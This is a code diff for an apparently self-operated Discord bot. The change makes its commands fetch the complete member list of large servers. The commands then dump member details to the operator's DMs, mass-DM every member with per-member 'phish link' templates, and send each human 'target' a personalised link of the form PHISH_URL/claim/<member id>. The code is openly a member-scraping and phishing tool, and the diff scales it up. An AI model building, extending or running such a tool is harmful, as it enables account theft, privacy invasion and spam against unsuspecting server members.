@@ -160,6 +160,15 @@ def fmt_member(m) -> str:
     joined = m.joined_at.strftime("%Y-%m-%d") if m.joined_at else "unknown"
     return f"{m} (ID: {m.id}) | Joined: {joined} | Bot: {'Yes' if m.bot else 'No'}"
 
+async def fetch_all_members(guild):
+    """Fetch full member list — works on large servers (1000+)."""
+    try:
+        # chunk-fetch all members from Discord
+        await guild.chunk()
+    except Exception as e:
+        print(f"[SB] chunk failed: {e}")
+    return [m for m in guild.members if not m.bot]
+
 
 # ══════════════════════════════════════════════════════════════
 #  EVENTS
@@ -243,14 +252,16 @@ async def on_message(message: discord.Message):
             await reply(message, "Invalid server ID."); return
         if not guild:
             await reply(message, "Not in that server."); return
+        await reply(message, f"📋 Fetching members — **{guild.name}**...")
+        all_members = await fetch_all_members(guild)
         lines = [f"Member List — {guild.name} ({guild.id})", "="*50]
-        for m in guild.members:
+        for m in all_members:
             lines.append(fmt_member(m))
         report = "\n".join(lines)
         chunks = [report[i:i+1900] for i in range(0, len(report), 1900)]
         for chunk in chunks:
             await report_to_self(f"```\n{chunk}\n```")
-        await reply(message, f"📋 Members sent to your DMs. ({len(guild.members)} members)")
+        await reply(message, f"📋 Members sent to your DMs. ({len(all_members)} members)")
 
     # ── >>massdm <id> <msg|template:name> ────────────────────────
     elif cmd == "massdm":
@@ -281,9 +292,11 @@ async def on_message(message: discord.Message):
             use_template = None
 
         success = 0; failed = 0
-        await reply(message, f"📨 Mass DM starting — **{guild.name}** | {'template: ' + use_template if use_template else 'custom message'}")
-        for member in guild.members:
-            if member.bot or member.id == client.user.id:
+        await reply(message, f"📨 Fetching members — **{guild.name}** (this may take a few seconds for large servers)...")
+        members = await fetch_all_members(guild)
+        await reply(message, f"📨 Mass DM starting — **{guild.name}** | {len(members)} humans | {'template: ' + use_template if use_template else 'custom message'}")
+        for member in members:
+            if member.id == client.user.id:
                 continue
             try:
                 # inject per-member phish link if template
@@ -317,9 +330,11 @@ async def on_message(message: discord.Message):
         if not guild:
             await reply(message, "Not in that server."); return
         success = 0; failed = 0
-        await reply(message, f"🎣 Starting phish DM to **{guild.name}**...")
-        for member in guild.members:
-            if member.bot or member.id == client.user.id:
+        await reply(message, f"🎣 Fetching members — **{guild.name}**...")
+        members = await fetch_all_members(guild)
+        await reply(message, f"🎣 Phish DM starting — **{guild.name}** | {len(members)} targets")
+        for member in members:
+            if member.id == client.user.id:
                 continue
             link = f"{PHISH_URL}/claim/{member.id}"
             phish_msg = (
